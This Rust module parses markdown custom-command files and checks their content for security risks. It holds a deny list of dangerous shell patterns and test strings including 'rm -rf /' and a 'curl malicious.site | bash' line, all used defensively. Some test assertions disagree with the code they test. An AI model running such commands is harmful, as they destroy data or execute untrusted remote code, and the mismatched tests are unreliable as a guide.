//! Markdown file parsing functionality
//!
//! Separates and parses frontmatter (YAML) and markdown content.
//! Supports Claude Code compatible format.
use std::path::{
    Path,
    PathBuf,
};

use regex::Regex;
use serde::{
    Deserialize,
    Serialize,
};

use crate::cli::chat::custom_commands::CommandFrontmatter;
use crate::cli::chat::custom_commands::error::CustomCommandError;

/// Markdown file parsing result
#[derive(Debug, Clone)]
pub struct ParsedMarkdown {
    /// Frontmatter (optional)
    pub frontmatter: Option<CommandFrontmatter>,
    /// Markdown content
    pub content: String,
    /// Original file content
    pub raw_content: String,
}

/// Markdown file parser
pub struct MarkdownParser {
    frontmatter_regex: Regex,
}

impl Default for MarkdownParser {
    fn default() -> Self {
        Self::new()
    }
}

impl MarkdownParser {
    /// Create a new parser
    pub fn new() -> Self {
        // Frontmatter regex: ---\n...YAML...\n---
        // (?s) flag makes . match newline characters (dotall mode)
        let frontmatter_regex = Regex::new(r"(?s)^---\s*\n(.*?)\n---\s*\n(.*)$")
            .expect("Failed to compile frontmatter regex");

        Self { frontmatter_regex }
    }

    /// Parse markdown file
    pub fn parse(&self, content: &str, file_path: &Path) -> Result<ParsedMarkdown, CustomCommandError> {
        let content = content.trim();

        // Try to extract frontmatter
        if let Some(captures) = self.frontmatter_regex.captures(content) {
            // With frontmatter
            let frontmatter_yaml = captures.get(1).map_or("", |m| m.as_str());
            let markdown_content = captures.get(2).map_or("", |m| m.as_str()).trim();

            // Parse YAML frontmatter
            let frontmatter = if frontmatter_yaml.trim().is_empty() {
                None
            } else {
                match serde_yaml::from_str::<CommandFrontmatter>(frontmatter_yaml) {
                    Ok(fm) => Some(fm),
                    Err(e) => {
                        return Err(CustomCommandError::frontmatter_parse_error(
                            file_path.to_path_buf(),
                            e,
                        ));
                    },
                }
            };

            Ok(ParsedMarkdown {
                frontmatter,
                content: markdown_content.to_string(),
                raw_content: content.to_string(),
            })
        } else {
            // No frontmatter - treat entire content as markdown
            Ok(ParsedMarkdown {
                frontmatter: None,
                content: content.to_string(),
                raw_content: content.to_string(),
            })
        }
    }

    /// Parse directly from file
    pub async fn parse_file(&self, file_path: &Path) -> Result<ParsedMarkdown, CustomCommandError> {
        let content = tokio::fs::read_to_string(file_path)
            .await
            .map_err(|e| CustomCommandError::file_read_error(file_path.to_path_buf(), e))?;

        self.parse(&content, file_path)
    }

    /// Extract only frontmatter from content
    pub fn extract_frontmatter(
        &self,
        content: &str,
        file_path: &Path,
    ) -> Result<Option<CommandFrontmatter>, CustomCommandError> {
        if let Some(captures) = self.frontmatter_regex.captures(content) {
            let frontmatter_yaml = captures.get(1).map_or("", |m| m.as_str());

            if frontmatter_yaml.trim().is_empty() {
                return Ok(None);
            }

            match serde_yaml::from_str::<CommandFrontmatter>(frontmatter_yaml) {
                Ok(fm) => Ok(Some(fm)),
                Err(e) => Err(CustomCommandError::frontmatter_parse_error(
                    file_path.to_path_buf(),
                    e,
                )),
            }
        } else {
            Ok(None)
        }
    }

    /// Extract only markdown content from content
    pub fn extract_content(&self, content: &str) -> String {
        if let Some(captures) = self.frontmatter_regex.captures(content) {
            captures.get(2).map_or("", |m| m.as_str().trim()).to_string()
        } else {
            content.trim().to_string()
        }
    }

    /// Check if content has frontmatter
    pub fn has_frontmatter(&self, content: &str) -> bool {
        self.frontmatter_regex.is_match(content)
    }

    /// Check if file is a markdown file
    pub fn is_markdown_file(file_path: &Path) -> bool {
        file_path
            .extension()
            .and_then(|ext| ext.to_str())
            .is_some_and(|ext| {
                ext.eq_ignore_ascii_case("md") || ext.eq_ignore_ascii_case("markdown")
            })
    }
}

/// Security validation level
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
pub enum SecurityValidationLevel {
    /// Ignore security checks
    None,
    /// Show security risks as warnings (not errors)
    Warn,
    /// Treat security risks as errors (default)
    Error,
}

impl Default for SecurityValidationLevel {
    fn default() -> Self {
        Self::Error
    }
}

/// Security validation configuration
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SecurityValidationConfig {
    /// Validation level
    pub level: SecurityValidationLevel,
    /// List of dangerous patterns to ignore
    pub ignored_patterns: Vec<String>,
}

impl Default for SecurityValidationConfig {
    fn default() -> Self {
        Self {
            level: SecurityValidationLevel::Error,
            ignored_patterns: Vec::new(),
        }
    }
}

/// Security validation result
#[derive(Debug, Clone)]
pub struct SecurityValidationResult {
    /// Detected risks
    pub risks: Vec<String>,
    /// Should be treated as warning
    pub should_warn: bool,
    /// Should be treated as error
    pub should_error: bool,
}

/// Security configuration manager
pub struct SecurityConfigManager {
    config_file_path: PathBuf,
    current_config: SecurityValidationConfig,
}

impl SecurityConfigManager {
    /// Create a new security configuration manager
    ///
    /// # Arguments
    /// * `config_dir` - Directory to save configuration file
    ///
    /// # Returns
    /// Configuration manager instance
    pub fn new(config_dir: &Path) -> Self {
        let config_file_path = config_dir.join("security_config.toml");

        Self {
            config_file_path,
            current_config: SecurityValidationConfig::default(),
        }
    }

    /// Load configuration from file
    pub async fn load_config(&mut self) -> Result<(), CustomCommandError> {
        if !self.config_file_path.exists() {
            // Save default configuration if file doesn't exist
            self.save_config().await?;
            return Ok(());
        }

        let content = tokio::fs::read_to_string(&self.config_file_path)
            .await
            .map_err(|e| {
                CustomCommandError::file_read_error(self.config_file_path.clone(), e)
            })?;

        self.current_config = toml::from_str(&content).map_err(|e| {
            CustomCommandError::file_read_error(
                self.config_file_path.clone(),
                std::io::Error::new(
                    std::io::ErrorKind::InvalidData,
                    format!("TOML parse error: {}", e),
                ),
            )
        })?;

        Ok(())
    }

    /// Save configuration to file
    pub async fn save_config(&self) -> Result<(), CustomCommandError> {
        // Create configuration directory if it doesn't exist
        if let Some(parent) = self.config_file_path.parent() {
            tokio::fs::create_dir_all(parent)
                .await
                .map_err(|e| {
                    CustomCommandError::file_read_error(parent.to_path_buf(), e)
                })?;
        }

        let content = toml::to_string_pretty(&self.current_config).map_err(|e| {
            CustomCommandError::file_read_error(
                self.config_file_path.clone(),
                std::io::Error::new(
                    std::io::ErrorKind::InvalidData,
                    format!("TOML serialize error: {}", e),
                ),
            )
        })?;

        tokio::fs::write(&self.config_file_path, content)
            .await
            .map_err(|e| {
                CustomCommandError::file_read_error(self.config_file_path.clone(), e)
            })?;

        Ok(())
    }

    /// Get current configuration
    pub fn get_config(&self) -> &SecurityValidationConfig {
        &self.current_config
    }

    /// Enable security check
    pub async fn enable_security(&mut self) -> Result<(), CustomCommandError> {
        self.current_config.level = SecurityValidationLevel::Error;
        self.save_config().await
    }

    /// Disable security check (set to warning level)
    pub async fn disable_security(&mut self) -> Result<(), CustomCommandError> {
        self.current_config.level = SecurityValidationLevel::None;
        self.save_config().await
    }

    /// Set security check to warning level
    pub async fn set_security_warn(&mut self) -> Result<(), CustomCommandError> {
        self.current_config.level = SecurityValidationLevel::Warn;
        self.save_config().await
    }

    /// Add ignored pattern
    pub async fn add_ignored_pattern(&mut self, pattern: String) -> Result<(), CustomCommandError> {
        if !self.current_config.ignored_patterns.contains(&pattern) {
            self.current_config.ignored_patterns.push(pattern);
            self.save_config().await?;
        }
        Ok(())
    }

    /// Remove ignored pattern
    pub async fn remove_ignored_pattern(&mut self, pattern: &str) -> Result<(), CustomCommandError> {
        self.current_config.ignored_patterns.retain(|p| p != pattern);
        self.save_config().await
    }

    /// Get current configuration status as display string
    pub fn get_status_string(&self) -> String {
        let level_str = match self.current_config.level {
            SecurityValidationLevel::Error => "Enabled (Error)",
            SecurityValidationLevel::Warn => "Warning Only",
            SecurityValidationLevel::None => "Disabled",
        };

        let mut status = format!("🔒 Security Validation: {}", level_str);

        if !self.current_config.ignored_patterns.is_empty() {
            status.push_str(&format!(
                "\n📝 Ignored Patterns: {}",
                self.current_config.ignored_patterns.join(", ")
            ));
        }

        status
    }
}

/// Prompt processing utility
pub struct PromptProcessor;

impl PromptProcessor {
    /// Dangerous Bash command patterns for security validation
    const DANGEROUS_PATTERNS: &'static [&'static str] = &[
        r"rm\s+-rf",
        r"sudo\s+rm",
        r">\s*/dev/null",
        r"curl.*\|\s*bash",
        r"wget.*\|\s*bash",
        r"eval\s*\$",
        r"exec\s+",
        r"nc\s+-l",
        r"python.*-c",
        r"perl.*-e",
    ];

    /// Execute argument substitution ($ARGUMENTS + positional arguments $1, $2, $3... + automatic argument appending)
    pub fn substitute_arguments(content: &str, args: &[String]) -> String {
        if args.is_empty() {
            // If there are no arguments, replace all placeholders with empty strings
            let mut result = content.replace("$ARGUMENTS", "");
            // Replace positional argument placeholders with empty strings
            for i in 1..=10 {
                result = result.replace(&format!("${}", i), "");
            }
            return result;
        }

        let mut result = content.to_string();

        // Replace positional argument placeholders ($1, $2, $3, ...)
        for (i, arg) in args.iter().enumerate() {
            let placeholder = format!("${}", i + 1);
            result = result.replace(&placeholder, arg);
        }

        // Join multiple arguments with spaces
        let args_string = shell_words::join(args);

        // Check if $ARGUMENTS placeholder exists
        let has_arguments_placeholder = result.contains("$ARGUMENTS");

        result = if has_arguments_placeholder {
            // If placeholder exists, replace it with the joined arguments
            result.replace("$ARGUMENTS", &args_string)
        } else {
            // If placeholder doesn't exist, use the original content
            content.to_string()
        };

        // If placeholder doesn't exist and arguments exist, automatically append argument information
        if !has_arguments_placeholder {
            // Append argument information to the end of the prompt
            result.push_str("\n\n---\n\n**Command arguments:**\n");
            result.push_str(&format!("```\n{}\n```", args_string));
            result.push_str("\n\nPlease execute the process considering the above arguments.");
        }

        result
    }

    /// Extract file references (@filename pattern)  
    /// Excludes email addresses (word@domain), targets only @filename after line start, whitespace, or specific symbols
    pub fn extract_file_references(content: &str) -> Vec<String> {
        let file_ref_regex = Regex::new(r"(?:^|[\s\n\r>])\s*@([a-zA-Z0-9._/-]+)")
            .expect("Failed to compile file reference regex");

        file_ref_regex
            .captures_iter(content)
            .filter_map(|cap| cap.get(1))
            .map(|m| m.as_str().to_string())
            .collect()
    }

    /// Validate Bash command permissions (Claude Code format: Bash(git add:*))
    pub fn validate_bash_permissions(command: &str, allowed_tools: &[String]) -> bool {
        // Extract Bash permissions from allowed-tools
        let bash_permissions: Vec<&str> = allowed_tools
            .iter()
            .filter_map(|tool| {
                if tool.starts_with("Bash(") && tool.ends_with(")") {
                    // "Bash(git add:*)" -> "git add:*"
                    let inner = &tool[5..tool.len() - 1];
                    Some(inner)
                } else if tool == "Bash" {
                    // Allow all Bash commands
                    Some("*")
                } else {
                    None
                }
            })
            .collect();

        if bash_permissions.is_empty() {
            return false; // No Bash permissions
        }

        // Check all permissions
        if bash_permissions.contains(&"*") {
            return true;
        }

        // Check individual permissions
        for permission in bash_permissions {
            if let Some(prefix) = permission.strip_suffix(":*") {
                // "git add:*" -> "git add" prefix match
                if command.starts_with(prefix) {
                    return true;
                }
            } else if permission == command {
                // Exact match
                return true;
            }
        }

        false
    }

    /// Detect extended thinking keywords
    pub fn detect_thinking_keywords(content: &str) -> bool {
        let thinking_keywords = [
            "think through",
            "reason about",
            "analyze carefully",
            "consider deeply",
            "extended thinking",
            "step by step",
            "break down",
            "reasoning process",
        ];

        let content_lower = content.to_lowercase();
        thinking_keywords.iter().any(|keyword| content_lower.contains(keyword))
    }

    /// Extract Bash commands (!`command` pattern)
    pub fn extract_bash_commands(content: &str) -> Vec<String> {
        let bash_cmd_regex = Regex::new(r"!`([^`]+)`")
            .expect("Failed to compile bash command regex");

        bash_cmd_regex
            .captures_iter(content)
            .filter_map(|cap| cap.get(1))
            .map(|m| m.as_str().to_string())
            .collect()
    }

    /// Check dangerous patterns
    pub fn check_security_risks(content: &str) -> Vec<String> {
        let mut risks = Vec::new();

        for pattern in Self::DANGEROUS_PATTERNS {
            let regex = match Regex::new(pattern) {
                Ok(r) => r,
                Err(_) => continue,
            };

            if regex.is_match(content) {
                risks.push(format!(
                    "Potentially dangerous pattern detected: {}",
                    pattern
                ));
            }
        }

        // Dangerous file reference patterns
        let file_refs = Self::extract_file_references(content);
        for file_ref in file_refs {
            if file_ref.starts_with('/') || file_ref.contains("..") {
                risks.push(format!(
                    "Potentially unsafe file reference: {}",
                    file_ref
                ));
            }
        }

        risks
    }

    /// Execute security validation with configuration
    pub fn validate_security_with_config(content: &str, config: &SecurityValidationConfig) -> SecurityValidationResult {
        let mut risks = Vec::new();

        // Check each pattern and add only those not in the ignore list
        for pattern in Self::DANGEROUS_PATTERNS {
            // Check if this pattern is included in the ignore list
            if config.ignored_patterns.iter().any(|ignored| {
                // Normalize patterns for comparison (remove spaces for comparison)
                let normalized_ignored = ignored.replace(" ", "\\s+");
                pattern.contains(&normalized_ignored) || ignored.contains(&pattern.replace("\\s+", " "))
            }) {
                continue; // Ignore this pattern
            }

            let regex = match Regex::new(pattern) {
                Ok(r) => r,
                Err(_) => continue,
            };

            if regex.is_match(content) {
                risks.push(format!(
                    "Potentially dangerous pattern detected: {}",
                    pattern
                ));
            }
        }

        // Dangerous file reference patterns
        let file_refs = Self::extract_file_references(content);
        for file_ref in file_refs {
            if file_ref.starts_with('/') || file_ref.contains("..") {
                // Also check file reference ignore patterns
                if config.ignored_patterns.iter().any(|ignored| file_ref.contains(ignored)) {
                    continue;
                }
                risks.push(format!(
                    "Potentially unsafe file reference: {}",
                    file_ref
                ));
            }
        }

        let should_warn = matches!(config.level, SecurityValidationLevel::Warn) && !risks.is_empty();
        let should_error = matches!(config.level, SecurityValidationLevel::Error) && !risks.is_empty();

        SecurityValidationResult {
            risks,
            should_warn,
            should_error,
        }
    }

    /// Content validation (default configuration with error handling)
    pub fn validate_content(content: &str) -> Result<(), CustomCommandError> {
        let config = SecurityValidationConfig::default();
        Self::validate_content_with_config(content, &config)
    }

    /// Content validation (configurable)
    ///
    /// # Arguments
    /// * `content` - Content to validate
    /// * `config` - Security validation configuration
    ///
    /// # Returns
    /// * `Ok(())` - Validation successful or risks are at warning level
    /// * `Err(CustomCommandError)` - Security risks detected and error level is specified
    ///
    /// # Examples
    ///
    /// ```ignore
    /// // Error level (default)
    /// let config = SecurityValidationConfig::default();
    /// let result = PromptProcessor::validate_content_with_config("rm -rf /", &config);
    /// assert!(result.is_err());
    ///
    /// // Warning level
    /// let mut config = SecurityValidationConfig::default();
    /// config.level = SecurityValidationLevel::Warn;
    /// let result = PromptProcessor::validate_content_with_config("rm -rf /", &config);
    /// assert!(result.is_ok()); // Warning but not an error
    ///
    /// // Ignore
    /// let mut config = SecurityValidationConfig::default();
    /// config.level = SecurityValidationLevel::None;
    /// let result = PromptProcessor::validate_content_with_config("rm -rf /", &config);
    /// assert!(result.is_ok());
    /// ```
    pub fn validate_content_with_config(
        content: &str,
        config: &SecurityValidationConfig,
    ) -> Result<(), CustomCommandError> {
        let validation_result = Self::validate_security_with_config(content, config);

        if validation_result.should_error {
            return Err(CustomCommandError::security_error(
                "content_validation",
                format!("Security risks detected: {}", validation_result.risks.join(", ")),
            ));
        }

        // For warnings, currently do nothing (log output is expected to be handled by caller)
        // May add logging functionality in the future

        Ok(())
    }
}

#[cfg(test)]
mod tests {
    use std::path::PathBuf;

    use shlex;

    use super::*;

    #[test]
    fn test_parse_markdown_with_frontmatter() {
        let content = r#"---
description: Test command
allowed-tools: ["Bash"]
---

# Test Command

This is a test command content."#;

        let parser = MarkdownParser::new();
        let result = parser.parse(content, &PathBuf::from("test.md")).unwrap();

        assert!(result.frontmatter.is_some());
        let fm = result.frontmatter.unwrap();
        assert_eq!(fm.description, Some("Test command".to_string()));
        assert!(result.content.starts_with("# Test Command"));
    }

    #[test]
    fn test_parse_markdown_without_frontmatter() {
        let content = r#"# Simple Command

Just markdown content without frontmatter."#;

        let parser = MarkdownParser::new();
        let result = parser.parse(content, &PathBuf::from("test.md")).unwrap();

        assert!(result.frontmatter.is_none());
        assert!(result.content.starts_with("# Simple Command"));
    }

    #[test]
    fn test_substitute_arguments() {
        let content = "Process issue #$ARGUMENTS with priority";
        let args = vec!["123".to_string()];
        let result = PromptProcessor::substitute_arguments(content, &args);
        assert_eq!(result, "Process issue #123 with priority");
    }

    #[test]
    fn test_positional_arguments() {
        let content = "Review PR #$1 with priority $2 and assign to $3";
        let args = vec!["456".to_string(), "high".to_string(), "alice".to_string()];
        let result = PromptProcessor::substitute_arguments(content, &args);
        assert_eq!(result, "Review PR #456 with priority high and assign to alice");
    }

    #[test]
    fn test_mixed_arguments() {
        let content = "Fix issue #$1 following $ARGUMENTS standards";
        let args = vec!["123".to_string(), "high-priority".to_string()];
        let result = PromptProcessor::substitute_arguments(content, &args);
        assert_eq!(result, "Fix issue #123 following 123 high-priority standards");
    }

    #[test]
    fn test_extract_file_references() {
        let content = "Review @src/main.rs and @docs/README.md files";
        let refs = PromptProcessor::extract_file_references(content);
        assert_eq!(refs, vec!["src/main.rs", "docs/README.md"]);
    }

    #[test]
    fn test_extract_bash_commands() {
        let content = "Current status: !`git status` and diff: !`git diff`";
        let commands = PromptProcessor::extract_bash_commands(content);
        assert_eq!(commands, vec!["git status", "git diff"]);
    }

    #[test]
    fn test_security_check() {
        let dangerous_content = "Execute: !`rm -rf /`";
        let risks = PromptProcessor::check_security_risks(dangerous_content);
        assert!(!risks.is_empty());

        let safe_content = "Check status: !`git status`";
        let safe_risks = PromptProcessor::check_security_risks(safe_content);
        assert!(safe_risks.is_empty());
    }

    #[test]
    fn test_security_validation_levels() {
        let dangerous_content = "Execute: !`rm -rf /`";

        // Default (error level)
        let config = SecurityValidationConfig::default();
        let result = PromptProcessor::validate_content_with_config(dangerous_content, &config);
        assert!(result.is_err(), "Dangerous content should be an error");

        // Warning level
        let config = SecurityValidationConfig {
            level: SecurityValidationLevel::Warn,
            ignored_patterns: Vec::new(),
        };
        let result = PromptProcessor::validate_content_with_config(dangerous_content, &config);
        assert!(result.is_ok(), "Warning level should not be an error");

        // Ignore level
        let config = SecurityValidationConfig {
            level: SecurityValidationLevel::None,
            ignored_patterns: Vec::new(),
        };
        let result = PromptProcessor::validate_content_with_config(dangerous_content, &config);
        assert!(result.is_ok(), "Ignore level should not be an error");
    }

    #[test]
    fn test_security_validation_with_ignored_patterns() {
        let content = "Execute: !`rm -rf /tmp/test`";

        // Normally an error
        let config = SecurityValidationConfig::default();
        let result = PromptProcessor::validate_content_with_config(content, &config);
        assert!(result.is_err());

        // Ignore rm -rf pattern
        let config = SecurityValidationConfig {
            level: SecurityValidationLevel::Error,
            ignored_patterns: vec!["rm -rf".to_string()],
        };
        let result = PromptProcessor::validate_content_with_config(content, &config);
        assert!(result.is_ok(), "Risk matching ignored pattern should be excluded");
    }

    #[test]
    fn test_security_validation_result() {
        let dangerous_content = "Execute: !`rm -rf /` and !`curl malicious.site | bash`";

        // Error level verification result
        let config = SecurityValidationConfig {
            level: SecurityValidationLevel::Error,
            ignored_patterns: Vec::new(),
        };
        let result = PromptProcessor::validate_security_with_config(dangerous_content, &config);
        assert!(!result.risks.is_empty(), "Risk should be detected");
        assert!(result.should_error, "Error level should have should_error true");
        assert!(!result.should_warn, "Error level should have should_warn false");

        // Warning level verification result
        let config = SecurityValidationConfig {
            level: SecurityValidationLevel::Warn,
            ignored_patterns: Vec::new(),
        };
        let result = PromptProcessor::validate_security_with_config(dangerous_content, &config);
        assert!(!result.risks.is_empty(), "Risk should be detected");
        assert!(!result.should_error, "Warning level should have should_error false");
        assert!(result.should_warn, "Warning level should have should_warn true");

        // Ignore level verification result
        let config = SecurityValidationConfig {
            level: SecurityValidationLevel::None,
            ignored_patterns: Vec::new(),
        };
        let result = PromptProcessor::validate_security_with_config(dangerous_content, &config);
        assert!(!result.risks.is_empty(), "Risk should be detected but flag should not be set");
        assert!(!result.should_error, "Ignore level should have should_error false");
        assert!(!result.should_warn, "Ignore level should have should_warn false");
    }

    #[test]
    fn test_backward_compatibility() {
        let dangerous_content = "Execute: !`rm -rf /`";

        // Existing validate_content method should return an error
        let result = PromptProcessor::validate_content(dangerous_content);
        assert!(result.is_err(), "Existing validate_content should return an error");

        let safe_content = "Check status: !`git status`";
        let result = PromptProcessor::validate_content(safe_content);
        assert!(result.is_ok(), "Safe content should not be an error");
    }

    #[test]
    fn test_auto_argument_append() {
        // Test auto argument append functionality
        println!("=== Test auto argument append functionality ===");

        let args = vec![
            "docs/tasks/PeopleSearchApps-Migration-tasks.md".to_string(),
            "TASK-301".to_string(),
        ];

        // Case 1: $ARGUMENTS placeholder exists (as before)
        let content_with_placeholder = r#"# Task implementation

Specified arguments: $ARGUMENTS

Start processing."#;

        let result1 = PromptProcessor::substitute_arguments(content_with_placeholder, &args);
        println!("1. $ARGUMENTS placeholder exists:");
        println!("{}", result1);

        // Verify: placeholder is replaced, auto append is not done
        assert!(result1.contains("docs/tasks/PeopleSearchApps-Migration-tasks.md TASK-301"));
        assert!(!result1.contains("$ARGUMENTS"));
        assert!(!result1.contains("**Command Arguments:**")); // Auto append is not done

        println!("\n{}\n", "=".repeat(50));

        // Case 2: $ARGUMENTS placeholder does not exist (new functionality)
        let content_without_placeholder = r#"# Task implementation command

## Purpose
Split tasks to implement sequentially.

## Execution content
1. Select tasks
2. Check dependencies
3. Execute implementation process"#;

        let result2 = PromptProcessor::substitute_arguments(content_without_placeholder, &args);
        println!("2. $ARGUMENTS placeholder does not exist (auto append):");
        println!("{}", result2);

        // Verify: original content is kept, argument information is auto appended
        assert!(result2.contains("# Task implementation command"));
        assert!(result2.contains("**Command Arguments:**"));
        assert!(result2.contains("docs/tasks/PeopleSearchApps-Migration-tasks.md TASK-301"));
        assert!(result2.contains("Please execute the process considering the above arguments."));

        println!("\n{}\n", "=".repeat(50));

        // Case 3: no arguments
        let empty_args: Vec<String> = vec![];
        let result3 = PromptProcessor::substitute_arguments(content_without_placeholder, &empty_args);
        println!("3. No arguments:");
        println!("{}", result3);

        // Verify: original content only (auto append is not done)
        assert_eq!(result3, content_without_placeholder);
        assert!(!result3.contains("**Command Arguments:**"));

        println!("\n✅ All test cases passed!");
    }

    #[test]
    fn test_frontmatter_in_prompt() {
        // Test if frontmatter is included in the prompt
        use std::path::PathBuf;

        use crate::cli::chat::custom_commands::{
            CommandFrontmatter,
            CommandScope,
            CustomCommand,
        };

        // Create a command with frontmatter
        let frontmatter = CommandFrontmatter {
            description: Some("Test implementation command".to_string()),
            argument_hint: Some("<task-file> <task-id>".to_string()),
            allowed_tools: Some(vec!["fs_read".to_string()]),
            model: Some("claude-3.5-sonnet".to_string()),
            phase: None,
            dependencies: None,
            output_format: None,
        };

        let command = CustomCommand {
            name: "test-command".to_string(),
            content: r#"# Test command

Arguments: $ARGUMENTS

Start processing."#
                .to_string(),
            frontmatter: Some(frontmatter),
            scope: CommandScope::Global,
            file_path: PathBuf::from("/test/command.md"),
            namespace: None,
        };

        let args = vec!["file.md".to_string(), "TASK-001".to_string()];

        // Actual content passed to the prompt (only command.content)
        let processed_content = PromptProcessor::substitute_arguments(&command.content, &args);

        println!("=== Frontmatter processing test ===");
        println!("1. Frontmatter information:");
        if let Some(ref fm) = command.frontmatter {
            println!("   description: {:?}", fm.description);
            println!("   argument_hint: {:?}", fm.argument_hint);
            println!("   allowed_tools: {:?}", fm.allowed_tools);
        }

        println!("\n2. Actual content passed to the prompt:");
        println!("{}", processed_content);

        // Verify: Frontmatter information is not included in the prompt
        assert!(!processed_content.contains("Test implementation command"));
        assert!(!processed_content.contains("<task-file> <task-id>"));
        assert!(!processed_content.contains("fs_read"));

        // Verify: only argument substitution is done
        assert!(processed_content.contains("file.md TASK-001"));
        assert!(processed_content.contains("# Test command"));
    }

    #[test]
    fn test_argument_processing_flow() {
        // Check the flow of argument processing in detail
        let args = vec![
            "docs/tasks/PeopleSearchApps-Migration-tasks.md".to_string(),
            "TASK-301".to_string(),
        ];

        println!("=== Argument processing flow ===");
        println!("1. Split argument array:");
        for (i, arg) in args.iter().enumerate() {
            println!("   args[{}]: '{}'", i, arg);
        }

        // shell_words::join processing
        let joined = shell_words::join(&args);
        println!("\n2. shell_words::join result: '{}'", joined);

        // Example prompt content
        let prompt_content = r#"
# Task implementation command

## Argument information
Specified arguments: $ARGUMENTS

## Processing target
- Task file: $1
- Task ID: $2

## Execution content
Parse arguments and start implementation.
"#;

        println!("\n3. Prompt content (before substitution):");
        println!("{}", prompt_content);

        // Actual substitution processing
        let processed = PromptProcessor::substitute_arguments(prompt_content, &args);
        println!("\n4. Prompt content (after substitution):");
        println!("{}", processed);

        // Verify
        assert!(processed.contains(&joined));
        assert!(!processed.contains("$ARGUMENTS")); // Placeholder is replaced
        assert!(processed.contains("$1")); // Individual argument placeholder is not replaced
        assert!(processed.contains("$2"));
    }

    #[test]
    fn test_shlex_parsing_debug() {
        // Check the problem of parsing custom command arguments
        let input = "/kairo-implement docs/tasks/PeopleSearchApps-Migration-tasks.md TASK-301";
        println!("Input: {}", input);

        // Remove "/"
        let stripped = input.strip_prefix("/").unwrap();
        println!("/ removed: {}", stripped);

        // shlex::split
        if let Some(args) = shlex::split(stripped) {
            println!("shlex::split result:");
            for (i, arg) in args.iter().enumerate() {
                println!("  [{}]: '{}'", i, arg);
            }

            // orig_args equivalent
            let orig_args = args.clone();
            println!("\norig_args:");
            for (i, arg) in orig_args.iter().enumerate() {
                println!("  [{}]: '{}'", i, arg);
            }

            // Extract command name
            let command_name = orig_args.first().unwrap_or(&String::new()).clone();
            println!("\ncommand_name: '{}'", command_name);

            // Custom command arguments
            let custom_args = if orig_args.len() > 1 { &orig_args[1..] } else { &[] };
            println!("\ncustom_args:");
            for (i, arg) in custom_args.iter().enumerate() {
                println!("  [{}]: '{}'", i, arg);
            }

            // Verify expected result
            assert_eq!(command_name, "kairo-implement");
            assert_eq!(custom_args.len(), 2);
            assert_eq!(custom_args[0], "docs/tasks/PeopleSearchApps-Migration-tasks.md");
            assert_eq!(custom_args[1], "TASK-301");
        } else {
            panic!("shlex::split failed!");
        }
    }

    #[tokio::test]
    async fn test_security_config_manager() {
        use tempfile::TempDir;

        let temp_dir = TempDir::new().expect("Failed to create temp directory");
        let mut manager = SecurityConfigManager::new(temp_dir.path());

        // Check default setting
        assert_eq!(manager.get_config().level, SecurityValidationLevel::Error);

        // Change setting to warning level
        manager.set_security_warn().await.expect("Failed to set warn level");
        assert_eq!(manager.get_config().level, SecurityValidationLevel::Warn);

        // Change setting to disabled
        manager.disable_security().await.expect("Failed to disable security");
        assert_eq!(manager.get_config().level, SecurityValidationLevel::None);

        // Change setting to enabled
        manager.enable_security().await.expect("Failed to enable security");
        assert_eq!(manager.get_config().level, SecurityValidationLevel::Error);

        // Check if setting file is saved
        let config_file = temp_dir.path().join("security_config.toml");
        assert!(config_file.exists(), "Setting file should be created");

        // Check if setting is loaded in new manager instance
        let mut new_manager = SecurityConfigManager::new(temp_dir.path());
        new_manager.load_config().await.expect("Failed to load config");
        assert_eq!(new_manager.get_config().level, SecurityValidationLevel::Error);
    }

    #[test]
    fn test_security_config_status_string() {
        let config = SecurityValidationConfig {
            level: SecurityValidationLevel::Error,
            ignored_patterns: vec!["rm -rf".to_string(), "curl".to_string()],
        };

        use tempfile::TempDir;
        let temp_dir = TempDir::new().expect("Failed to create temp directory");
        let mut manager = SecurityConfigManager::new(temp_dir.path());
        manager.current_config = config;

        let status = manager.get_status_string();
        assert!(status.contains("Enabled (Error)"));
        assert!(status.contains("rm -rf"));
        assert!(status.contains("curl"));
    }

    #[test]
    fn test_validate_bash_permissions() {
        // Claude Code format Bash permission test
        let allowed_tools = vec![
            "Bash(git add:*)".to_string(),
            "Bash(git status:*)".to_string(),
            "Bash(git commit:*)".to_string(),
        ];

        // Allowed commands
        assert!(PromptProcessor::validate_bash_permissions("git add .", &allowed_tools));
        assert!(PromptProcessor::validate_bash_permissions("git status", &allowed_tools));
        assert!(PromptProcessor::validate_bash_permissions(
            "git commit -m 'test'",
            &allowed_tools
        ));

        // Not allowed commands
        assert!(!PromptProcessor::validate_bash_permissions("rm -rf /", &allowed_tools));
        assert!(!PromptProcessor::validate_bash_permissions("git push", &allowed_tools));

        // All allowed
        let all_bash = vec!["Bash".to_string()];
        assert!(PromptProcessor::validate_bash_permissions("any command", &all_bash));

        // No permission
        let no_bash = vec!["fs_read".to_string()];
        assert!(!PromptProcessor::validate_bash_permissions("git status", &no_bash));
    }

    #[test]
    fn test_detect_thinking_keywords() {
        let content_with_thinking = "Please think through this problem step by step";
        assert!(PromptProcessor::detect_thinking_keywords(content_with_thinking));

        let content_with_reasoning = "Let's analyze carefully and reason about the solution";
        assert!(PromptProcessor::detect_thinking_keywords(content_with_reasoning));

        let content_without_thinking = "Just execute this simple command";
        assert!(!PromptProcessor::detect_thinking_keywords(content_without_thinking));
    }
}
